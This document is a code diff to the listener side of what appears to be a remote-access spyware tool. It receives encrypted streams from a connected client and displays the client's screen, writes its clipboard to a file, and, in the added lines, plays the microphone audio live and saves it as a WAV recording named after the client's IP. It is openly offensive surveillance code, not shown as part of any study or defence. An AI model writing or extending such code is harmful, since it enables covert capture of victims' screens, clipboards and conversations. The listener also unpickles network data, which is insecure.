@@ -3,11 +3,14 @@ import struct
 import pickle
 import cv2
 import numpy as np
+import sounddevice as sd
+from scipy.io.wavfile import write
 from cryptography.fernet import Fernet
+
 
 def listener(ip, port):
     port = int(port)
-    HOST = ip  
+    HOST = ip
     PORT = port
 
     print(f"[*] Waiting for connection on {HOST}:{PORT}...")
@@ -26,9 +29,12 @@ def listener(ip, port):
     data_buffer = b""
     payload_size = struct.calcsize("Q")
 
+    # Buffer to save all audio chunks for optional saving
+    audio_buffer = []
+
     while True:
         try:
-            # Ensure have the payload size
+            # Ensure we have the payload size
             while len(data_buffer) < payload_size:
                 packet = conn.recv(4096)
                 if not packet:
@@ -50,28 +56,30 @@ def listener(ip, port):
             encrypted_data = data_buffer[:msg_size]
             data_buffer = data_buffer[msg_size:]
 
-            # Decrypt and deserialize the data (frame and clipboard)
+            # Decrypt and deserialize the data (frame, clipboard, audio)
             decrypted_data = cipher.decrypt(encrypted_data)
             data = pickle.loads(decrypted_data)
 
-            # Extract frame and clipboard content
             frame = data.get("frame")
             clipboard = data.get("clipboard", "")
-
-            # Ensure frame is a valid 3D NumPy array
-            if not isinstance(frame, np.ndarray) or len(frame.shape) != 3:
-                print("[!] Received an invalid frame. Not a 3D NumPy array.")
-                continue
+            audio_chunk = data.get("audio")
 
             # Display the screen frame
-            cv2.imshow(f"{addr} -> Screen", frame)
+            if isinstance(frame, np.ndarray) and len(frame.shape) == 3:
+                cv2.imshow(f"{addr} -> Screen", frame)
 
             # Save clipboard content
-            with open("clipboard_data.txt", "w") as clipboard_file:
-                clip_ip = str(addr)
-                cb_text = "Client: " + clip_ip + " Data: "+clipboard
-                clipboard_file.write(cb_text)
+            if clipboard:
+                with open("clipboard_data.txt", "w") as clipboard_file:
+                    cb_text = f"Client: {addr}\nData: {clipboard}"
+                    clipboard_file.write(cb_text)
 
+            # Play audio live and buffer it for saving later
+            if isinstance(audio_chunk, np.ndarray) and audio_chunk.size > 0:
+                sd.play(audio_chunk, samplerate=44100)  # Live playback
+                audio_buffer.append(audio_chunk)  # Save for complete recording
+
+            # Exit condition
             if cv2.waitKey(1) & 0xFF == ord('q'):
                 break
 
@@ -81,6 +89,17 @@ def listener(ip, port):
         except Exception as e:
             print(f"[!] Error processing data: {e}")
             break
+
+    # Save the complete audio recording after connection closes
+    if audio_buffer:
+        complete_audio = np.concatenate(audio_buffer)
+
+        # Ensure correct data type for WAV
+        if complete_audio.dtype != np.int16:
+            complete_audio = np.int16(complete_audio * 32767)
+
+        write(f"{addr[0]}_complete_audio.wav", 44100, complete_audio)
+        print(f"[+] Full audio saved as {addr[0]}_complete_audio.wav")
 
     cv2.destroyAllWindows()
     conn.close()
